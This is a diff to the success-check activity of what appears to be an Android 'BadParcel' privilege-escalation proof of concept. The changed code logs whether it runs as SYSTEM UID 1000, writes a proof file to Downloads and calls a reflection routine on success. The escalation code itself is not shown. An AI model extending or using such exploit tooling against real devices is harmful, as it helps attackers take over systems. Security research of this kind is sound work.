@@ -18,37 +18,33 @@ public class ProofActivity extends Activity {
         super.onCreate(savedInstanceState);
 
         int myUid = Process.myUid();
-        int callerUid = getCallingUid(); // 起動元のUID
 
-        String msg = "[+] ProofActivity started. My UID=" + myUid + ", Caller UID=" + callerUid;
+        String msg = "[+] ProofActivity started. My UID=" + myUid;
         Log.i(TAG, msg);
         MainActivity.appendLog(msg);
 
         if (myUid == 1000) {
             MainActivity.appendLog("[!!!] SUCCESS: Process running with SYSTEM UID (1000) !!!");
-            createProofFile("system");
+            createProofFile();
             attemptSecureUIReflection();
-        } else if (callerUid == 1000) {
-            // 起動元がシステムだが、自分はシステムでない場合（通常起こらない）
-            MainActivity.appendLog("[!] Called by system but not running as system (myUid=" + myUid + ")");
-            createProofFile("caller_system");
         } else {
             MainActivity.appendLog("[!] UID=" + myUid + " (not system). Exploit may have failed.");
+            // 失敗しても証跡は残す（デバッグ用）
+            createProofFile();
         }
 
         finish();
     }
 
-    private void createProofFile(String type) {
+    private void createProofFile() {
         try {
             File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
             if (!dir.exists()) dir.mkdirs();
-            File proof = new File(dir, "uid_proof_" + type + ".txt");
+            File proof = new File(dir, "uid_proof.txt");
             try (PrintWriter pw = new PrintWriter(new FileOutputStream(proof))) {
                 pw.println("Process UID: " + Process.myUid());
-                pw.println("Caller UID: " + getCallingUid());
                 pw.println("Timestamp: " + new java.util.Date());
-                pw.println("BadParcel exploit " + (type.equals("system") ? "succeeded!" : "partial"));
+                pw.println("BadParcel exploit status: " + (Process.myUid() == 1000 ? "SUCCESS" : "FAILED"));
             }
             MainActivity.appendLog("[+] Proof file created: " + proof.getAbsolutePath());
         } catch (Exception e) {
